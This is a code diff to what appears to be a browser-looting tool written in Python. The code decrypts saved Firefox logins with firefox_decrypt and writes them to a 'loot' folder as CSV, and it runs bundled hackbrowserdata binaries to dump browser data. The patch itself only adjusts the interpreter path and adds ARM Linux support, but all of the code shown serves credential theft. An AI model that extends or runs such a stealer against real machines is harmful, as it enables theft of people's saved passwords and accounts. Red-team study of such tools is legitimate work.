@@ -126,7 +126,7 @@ def get_data(browser_dict: dict, cookies=None, logins=False, history=False, mast
 		if logins:
 			div()
 			logins_file = f"{loot_dir}/{filename}_logins.csv"
-			login_output = os.popen(f'echo {masterpass} | python3 "{script_path}/tools/firefox_decrypt/firefox_decrypt.py" "{profile}" -n --format csv --csv-delimiter ","').read()
+			login_output = os.popen(f'echo {masterpass} | {python} "{script_path}/tools/firefox_decrypt/firefox_decrypt.py" "{profile}" -n --format csv --csv-delimiter ","').read()
 			print(f"Login data for profile {profile}:\n")
 			with open(logins_file, 'w') as f:
 				f.write(login_output)
@@ -154,7 +154,7 @@ if __name__ == '__main__':
 	options = parser.parse_args()
 
 	info = Info()
-
+	python = info.python
 	user = info.username
 	if options.username:
 		user = options.username
@@ -208,7 +208,9 @@ if __name__ == '__main__':
 	# Get All (using golang binaries under './tools/hackbrowserdata'):
 	if options.all_true:
 		hackbrowserdata = os.path.abspath(f"tools/hackbrowserdata/hbd-{info.platform}-{info.arch}")
-		if info.platform == 'Windows':
+		if info.arm and info.platform == 'Linux':
+			hackbrowserdata = os.path.abspath(f"tools/hackbrowserdata/hbd-{info.platform}-{info.arm}")
+		elif info.platform == 'Windows':
 			hackbrowserdata = f"{hackbrowserdata}.exe"
 		os.chdir(f"./loot/{user}")
 		output = os.popen(f"{hackbrowserdata}").read()
